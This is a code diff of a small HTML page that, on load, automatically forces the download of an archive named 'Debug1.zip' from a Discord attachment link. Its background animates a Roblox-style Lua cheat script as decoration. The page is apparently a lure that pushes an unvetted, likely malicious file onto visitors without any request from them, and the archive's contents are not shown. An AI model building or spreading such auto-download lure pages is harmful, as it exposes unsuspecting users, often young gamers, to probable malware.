@@ -3,18 +3,137 @@
 <head>
   <meta charset="UTF-8" />
   <title>Auto Download</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: monospace;
+      background-color: black;
+      overflow: hidden;
+      color: white;
+    }
+
+    .background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      padding: 30px;
+      z-index: -1;
+      opacity: 0.18;
+      overflow: hidden;
+      pointer-events: none;
+    }
+
+    pre code {
+      font-size: 15px;
+      white-space: pre-wrap;
+    }
+
+    .content {
+      position: relative;
+      z-index: 1;
+      padding: 100px 20px;
+      text-align: center;
+    }
+
+    a {
+      color: #00ffff;
+      text-decoration: underline;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
+  <div class="background">
+    <pre><code class="language-lua" id="codeBackground"></code></pre>
+  </div>
+
+  <div class="content">
+    <p>If your download doesn't start automatically,
+      <a href="https://cdn.discordapp.com/attachments/1367238501711614023/1371343199515181106/Debug1.zip?ex=68426e61&is=68411ce1&hm=4236ff4c4bbd9b85d56791ef29bc14fa2f8c6e9b7a59a1bdcf1ab1cf4adeaa3c&" download>
+        click here
+      </a>.
+    </p>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-lua.min.js"></script>
   <script>
-    window.onload = function() {
+    // Auto download
+    window.onload = function () {
       const link = document.createElement('a');
-      link.href = ' https://cdn.discordapp.com/attachments/1367238501711614023/1371343199515181106/Debug1.zip?ex=68426e61&is=68411ce1&hm=4236ff4c4bbd9b85d56791ef29bc14fa2f8c6e9b7a59a1bdcf1ab1cf4adeaa3c& '; // <-- replace this URL
-      link.download = ''; // This attribute suggests download behavior
+      link.href = 'https://cdn.discordapp.com/attachments/1367238501711614023/1371343199515181106/Debug1.zip?ex=68426e61&is=68411ce1&hm=4236ff4c4bbd9b85d56791ef29bc14fa2f8c6e9b7a59a1bdcf1ab1cf4adeaa3c&';
+      link.download = '';
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
     }
+
+    // Lua code with syntax highlighting
+    const codeLines = [
+      "-- Lua full example background simulation",
+      "local Players = game:GetService('Players')",
+      "local player = Players.LocalPlayer",
+      "local character = player.Character or player.CharacterAdded:Wait()",
+      "local humanoid = character:WaitForChild('Humanoid')",
+      "local head = character:WaitForChild('Head')",
+      "",
+      "-- Movement enhancement",
+      "humanoid.WalkSpeed = 50",
+      "humanoid.JumpPower = 100",
+      "",
+      "-- Boost function",
+      "function boostPlayer()",
+      "    humanoid.JumpPower = humanoid.JumpPower + 20",
+      "    print('Jump Boost triggered!')",
+      "end",
+      "",
+      "-- Connect boost to key press",
+      "game:GetService('UserInputService').InputBegan:Connect(function(input)",
+      "    if input.KeyCode == Enum.KeyCode.B then",
+      "        boostPlayer()",
+      "    end",
+      "end)",
+      "",
+      "-- Simple GUI feedback",
+      "local gui = Instance.new('ScreenGui', player.PlayerGui)",
+      "local label = Instance.new('TextLabel', gui)",
+      "label.Text = 'Boost Active!'",
+      "label.Position = UDim2.new(0.4, 0, 0.1, 0)",
+      "label.Size = UDim2.new(0.2, 0, 0.05, 0)",
+      "label.TextColor3 = Color3.new(1, 1, 1)",
+      "label.BackgroundTransparency = 1",
+      "",
+      "-- Random color blink every 5 seconds",
+      "while true do",
+      "    wait(5)",
+      "    head.BrickColor = BrickColor.Random()",
+      "    print('Color changed: '.. tostring(head.BrickColor))",
+      "end"
+    ];
+
+    const codeEl = document.getElementById('codeBackground');
+    let i = 0;
+
+    function typeLine() {
+      if (i < codeLines.length) {
+        codeEl.textContent += codeLines[i] + "\n";
+        Prism.highlightElement(codeEl);
+        i++;
+        setTimeout(typeLine, 50);
+      } else {
+        setTimeout(() => {
+          codeEl.textContent = '';
+          i = 0;
+          typeLine();
+        }, 3000);
+      }
+    }
+
+    typeLine();
   </script>
-  <p>If your download doesn't start automatically, <a href="https://example.com/path/to/yourfile.zip" download>click here</a>.</p>
 </body>
 </html>
